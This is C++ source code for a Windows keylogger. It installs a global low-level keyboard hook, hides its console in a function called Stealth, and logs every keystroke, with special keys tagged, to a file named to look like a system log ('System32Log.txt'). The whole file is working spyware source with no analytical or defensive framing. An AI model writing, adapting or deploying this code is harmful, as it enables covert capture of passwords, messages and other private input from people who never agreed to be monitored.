#include <Windows.h>
#include <time.h>
#include <iostream>
#include <fstream>
#include <ctime>
#define _CRT_SECURE_NO_WARNINGS


HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;
std::ofstream OUTPUT_FILE;
WCHAR lastwindow[256];

int Save(int key_stroke);  // Move the declaration here

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && wParam == WM_KEYDOWN)
    {
        kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
        Save(kbdStruct.vkCode);
    }

    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        MessageBox(NULL, L"Failed to install hook!", L"Error", MB_ICONERROR); // Use L"..." for wide character strings
    }
}

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}



void Stealth()
{
    FreeConsole();
    //ShowWindow(GetConsoleWindow(), SW_HIDE);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    OUTPUT_FILE.open("System32Log.txt", std::ios_base::app);

    Stealth();
    SetHook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
    }

    ReleaseHook();
    return 0;
}

int Save(int key_stroke)
{
    if (key_stroke == 1 || key_stroke == 2)
        return 0; // ignore mouse clicks

    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout = nullptr;
    if (foreground)
    {
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground)
    {
        WCHAR window_title[256]; // Use WCHAR for wide character strings
        GetWindowText(foreground, window_title, 256);

        if (wcscmp(window_title, lastwindow) != 0) // Use wcscmp for wide character strings
        {
            wcscpy_s(lastwindow, window_title); // Use wcscpy_s for wide character strings
            time_t t = time(NULL);
            struct tm tm;
            char s[64]; // Use wchar_t for wide character strings
            if (localtime_s(&tm, &t) == 0)
            {
                strftime(s, sizeof(s), "%c", &tm);
            }
        }
    }

    std::wcout << key_stroke << L'\n'; // Use std::wcout for wide character strings

    switch (key_stroke)
    {
    case VK_BACK:
        OUTPUT_FILE << "[BACKSPACE]";
        break;
    case VK_RETURN:
        OUTPUT_FILE << "\n";
        break;
    case VK_SPACE:
        OUTPUT_FILE << " ";
        break;
    case VK_TAB:
        OUTPUT_FILE << "[TAB]";
        break;
    case VK_SHIFT:
    case VK_LSHIFT:
    case VK_RSHIFT:
        OUTPUT_FILE << "[SHIFT]";
        break;
    case VK_CONTROL:
    case VK_LCONTROL:
    case VK_RCONTROL:
        OUTPUT_FILE << "[CONTROL]";
        break;
    case VK_ESCAPE:
        OUTPUT_FILE << "[ESCAPE]";
        break;
    case VK_END:
        OUTPUT_FILE << "[END]";
        break;
    case VK_HOME:
        OUTPUT_FILE << "[HOME]";
        break;
    case VK_LEFT:
        OUTPUT_FILE << "[LEFT]";
        break;
    case VK_UP:
        OUTPUT_FILE << "[UP]";
        break;
    case VK_RIGHT:
        OUTPUT_FILE << "[RIGHT]";
        break;
    case VK_DOWN:
        OUTPUT_FILE << "[DOWN]";
        break;
    case 190:
    case 110:
        OUTPUT_FILE << ".";
        break;
    case 189:
    case 109:
        OUTPUT_FILE << "-";
        break;
    case 20:
        OUTPUT_FILE << "[CAPSLOCK]";
        break;
    default:
        char key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) == 0);
        if (GetKeyState(VK_SHIFT) & 0x1000 || GetKeyState(VK_LSHIFT) & 0x1000 || GetKeyState(VK_RSHIFT) & 0x1000)
        {
            lowercase = !lowercase;
        }
        key = lowercase ? tolower(key) : key;
        OUTPUT_FILE << char(key);
    }

    OUTPUT_FILE.flush();
    return 0;
}
